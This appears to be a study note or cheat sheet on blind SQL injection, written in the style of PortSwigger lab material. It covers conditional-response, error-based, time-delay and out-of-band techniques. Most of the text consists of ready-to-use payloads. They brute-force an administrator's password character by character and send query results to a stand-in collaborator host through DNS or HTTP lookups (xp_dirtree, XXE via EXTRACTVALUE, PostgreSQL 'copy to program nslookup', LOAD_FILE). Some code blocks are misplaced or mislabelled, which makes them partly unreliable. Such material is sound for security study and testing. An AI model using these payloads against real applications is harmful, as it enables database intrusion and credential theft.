# Blind SQL injection

Blind SQL injection occurs when an application is vulnerable to SQL injection, but its HTTP responses do not contain the results of the relevant SQL query or the details of any database errors.

Many techniques such as UNION attacks are not effective with blind SQL injection vulnerabilities. This is because they rely on being able to see the results of the injected query within the application's responses. It is still possible to exploit blind SQL injection to access unauthorized data, but different techniques must be used.

### Table of Content

- [Condition responses](#exploiting-blind-sql-injection-by-triggering-conditional-responses)
    - [Verfy tab and column](#verf-tab-and-column)
    - [Calcul the length of the password](#calcul-the-length-of-the-password)
    - [Brut force password](#brut-force-password)
- [Error-based SQL injection](#error-based-sql-injection)
    - [Length of the password](#length-of-the-password)
    - [Extract password](#extract-password)
- [Extraction sensitive data via verbose SQL error messages](#extraction-sensitive-data-via-verbose-sql-error-messages)
- [Exploiting blind SQL injection by triggering time delays](#exploiting-blind-sql-injection-by-triggering-time-delays)
- [Exploiting blind SQL injection using out-of-band (OAST) techniques](#exploiting-blind-sql-injection-using-out-of-band-oast-techniques)

## Exploiting blind SQL injection by triggering conditional responses

Consider an application that uses tracking cookies to gather analytics about usage. Requests to the application include a cookie header like this:

`Cookie: TrackingId=u5YD3PapBcR4lN3e7Tj4`
When a request containing a TrackingId cookie is processed, the application uses a SQL query to determine whether this is a known user:

```sql
SELECT TrackingId FROM TrackedUsers WHERE TrackingId = 'u5YD3PapBcR4lN3e7Tj4'
```
This query is vulnerable to SQL injection, but the results from the query are not returned to the user. However, the application does behave differently depending on whether the query returns any data. If you submit a recognized TrackingId, the query returns data and you receive a "Welcome back" message in the response.

This behavior is enough to be able to exploit the blind SQL injection vulnerability. You can retrieve information by triggering different responses conditionally, depending on an injected condition.

To understand how this exploit works, suppose that two requests are sent containing the following TrackingId cookie values in turn:

```sql
…xyz' AND '1'='1
…xyz' AND '1'='2
```

- The first of these values causes the query to return results, because the injected AND '1'='1 condition is true. As a result, the "Welcome back" message is displayed.
- The second value causes the query to not return any results, because the injected condition is false. The "Welcome back" message is not displayed.

If nothing as changed goto [error-based](#error-based-sql-injection).

For example, suppose there is a table called Users with the columns Username and Password, and a user called Administrator. You can determine the password for this user by sending a series of inputs to test the password one character at a time.

### Verf tab and column:

You did verify if the injection worked well, and manage to see the diff between error and valid item. 

Now if you are looking for password of a special user:

:warning: payload could be different due to the version of SQL: [cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)

- Verif tab users:

`TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a`

- Verif column username with adminstrator: 

`TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a`

### calcul the length of the password: 

```sql
' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)=1) = 'a
```

Brute force the length and look for change when the AND return true

### Brut force password

:warning: Oracle syntax for `SUBSTRING` is `SUBSTR('foo', 1, 1)`

```sql
AND SUBSTRING((SELECT password FROM users WHERE username = 'administrator'), 1, 1) = 'a
```

## Error-based SQL injection

Error-based SQL injection refers to cases where you're able to use error messages to either extract or infer sensitive data from the database, even in blind contexts.

To see how this works, suppose that two requests are sent containing the following TrackingId cookie values in turn:

:warning: Syntax can be different from diff SQL

```sql
-- Oracle 
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual 

-- Microsoft 
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/0 ELSE NULL END

-- PostgreSQL 
1 = (SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 1/(SELECT 0) ELSE NULL END)

-- MySQL
SELECT IF(YOUR-CONDITION-HERE,(SELECT table_name FROM information_schema.tables),'a') 
```

These inputs use the CASE keyword to test a condition and return a different expression depending on whether the expression is true:

With the first input, the CASE expression evaluates to 'a', which does not cause any error.

With the second input, it evaluates to 1/0, which causes a divide-by-zero error.

If the error causes a difference in the application's HTTP response, you can use this to determine whether the injected condition is true.

### Length of the password

ORACLE EX:

```sql
' AND (SELECT CASE WHEN (LENGTH(password)<1) THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --
```

This should not throw an error but should if you invert `<` with `>`

Brut force with burp changing the sign of the operation with `=`, and when it throw an error, it mean you found the length.

### Extract password

Using this technique, you can retrieve data by testing one character at a time:

:warning: Oracle syntax for `SUBSTRING` is `SUBSTR('foo', 1, 1)`

```sql
xyz' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN 1/0 ELSE 'a' END FROM Users)='a

-- Oracle
xyz' AND (SELECT CASE WHEN (SUBSTR(password, 1, 1) = 'a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator')='a' --
```

## Extraction sensitive data via verbose SQL error messages

Misconfiguration of the database sometimes results in verbose error messages. These can provide information that may be useful to an attacker. For example, consider the following error message, which occurs after injecting a single quote into an id parameter:

Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = '''. Expected char

This shows the full query that the application constructed using our input. We can see that in this case, we're injecting into a single-quoted string inside a WHERE statement. This makes it easier to construct a valid query containing a malicious payload. Commenting out the rest of the query would prevent the superfluous single-quote from breaking the syntax.

You can use the CAST() function to turns an otherwise blind SQL injection vulnerability into a visible one.

For example, imagine a query containing the following statement:

```sql
-- Microsof
SELECT 'foo' WHERE 1 = (SELECT 'secret')
-- > Conversion failed when converting the varchar value 'secret' to data type int. 

-- OTHERS
CAST((SELECT example_column FROM example_table) AS int)
```

ERROR: invalid input syntax for type integer: "Example data"

This type of query may also be useful if a character limit prevents you from triggering conditional responses.

## Exploiting blind SQL injection by triggering time delays

If the application catches database errors when the SQL query is executed and handles them gracefully, there won't be any difference in the application's response. This means the previous technique for inducing conditional errors will not work.

:warning: Triggring time delay Queries depend of the version of SQL

```sql
-- Oracle 
dbms_pipe.receive_message(('a'),10)
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN 'a'||dbms_pipe.receive_message(('a'),10) ELSE NULL END FROM dual

-- Microsoft
WAITFOR DELAY '0:0:10' 
IF (YOUR-CONDITION-HERE) WAITFOR DELAY '0:0:10' 

-- PostgreSQL
SELECT pg_sleep(10)
SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN pg_sleep(10) ELSE pg_sleep(0) END 

-- MySQL
SELECT SLEEP(10)
SELECT IF(YOUR-CONDITION-HERE,SLEEP(10),'a')
```

Example of guessing password on Microsoft with this approach:

```sql
-- Microsoft
'|| IF (SELECT COUNT(Username) FROM Users WHERE Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--

-- PostgreSQL
' || (SELECT CASE WHEN (LENGTH(password) > 1) THEN pg_sleep(2) ELSE 'a' END FROM users WHERE username='administrator') --
' || (SELECT CASE WHEN (SUBSTRING(password, 1,1) = 'a') THEN pg_sleep(2) ELSE 'a' END FROM users WHERE username='administrator') --
```

## Exploiting blind SQL injection using out-of-band (OAST) techniques

An application might carry out the same SQL query as the previous example but do it asynchronously. The application continues processing the user's request in the original thread, and uses another thread to execute a SQL query using the tracking cookie. The query is still vulnerable to SQL injection, but none of the techniques described so far will work. The application's response doesn't depend on the query returning any data, a database error occurring, or on the time taken to execute the query.

In this situation, it is often possible to exploit the blind SQL injection vulnerability by triggering out-of-band network interactions to a system that you control. These can be triggered based on an injected condition to infer information one piece at a time. More usefully, data can be exfiltrated directly within the network interaction.

A variety of network protocols can be used for this purpose, but typically the most effective is DNS (domain name service). Many production networks allow free egress of DNS queries, because they're essential for the normal operation of production systems.

### Burp Collaborator

To cause the database to perform a lokup for the a domain:

```sql
-- Oracle (elvated privileg require)
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual
--data exfiltration
SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT YOUR-QUERY-HERE)||'.BURP-COLLABORATOR-SUBDOMAIN/"> %remote;]>'),'/l') FROM dual

-- Microsoft
SELECT UTL_INADDR.get_host_address('BURP-COLLABORATOR-SUBDOMAIN')
exec master..xp_dirtree '//BURP-COLLABORATOR-SUBDOMAIN/a' 
--data exfiltration
declare @p varchar(1024);set @p=(SELECT YOUR-QUERY-HERE);exec('master..xp_dirtree "//'+@p+'.BURP-COLLABORATOR-SUBDOMAIN/a"')
create OR replace function f() returns void as $$
declare c text;
declare p text;
begin

-- PostgreSQL
copy (SELECT '') to program 'nslookup BURP-COLLABORATOR-SUBDOMAIN'
--data exfiltration
SELECT into p (SELECT YOUR-QUERY-HERE);
c := 'copy (SELECT '''') to program ''nslookup '||p||'.BURP-COLLABORATOR-SUBDOMAIN''';
execute c;
END;
$$ language plpgsql security definer;
SELECT f(); 

-- MySQL (Windows only)
LOAD_FILE('\\\\BURP-COLLABORATOR-SUBDOMAIN\\a')
SELECT ... INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'
--data exfiltration
SELECT YOUR-QUERY-HERE INTO OUTFILE '\\\\BURP-COLLABORATOR-SUBDOMAIN\a'

---

[**:arrow_right_hook: Back home**](/README.md)